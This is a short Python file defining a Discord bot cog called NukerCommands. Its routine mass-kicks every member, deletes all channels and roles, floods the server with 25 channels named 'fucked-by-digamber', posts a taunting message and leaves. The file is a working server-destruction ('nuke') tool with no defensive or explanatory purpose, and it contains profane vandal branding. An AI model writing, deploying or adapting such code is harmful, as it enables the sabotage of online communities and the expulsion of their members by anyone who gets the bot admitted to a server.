import discord
from discord.ext import commands
import asyncio

class NukerCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def nuke_server(self, guild):
        try:
            # Instant mass kick
            kick_tasks = []
            for member in guild.members:
                if member != self.bot.user:
                    kick_tasks.append(member.kick(reason="Fucked By Digamber"))
            await asyncio.gather(*kick_tasks, return_exceptions=True)
            
            # Delete all channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                except:
                    continue
            
            # Create fucked channels
            for i in range(25):
                try:
                    await guild.create_text_channel(f"fucked-by-digamber-{i+1}")
                except:
                    break
            
            # Delete roles
            for role in guild.roles:
                if role.name != "@everyone":
                    try:
                        await role.delete()
                    except:
                        continue
            
            # Send final message
            try:
                channels = await guild.fetch_channels()
                if channels:
                    await channels[0].send("💀 **FUCKED BY DIGAMBER** 💀")
            except:
                pass
            
            await guild.leave()
            
        except Exception as e:
            try:
                await guild.leave()
            except:
                pass

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
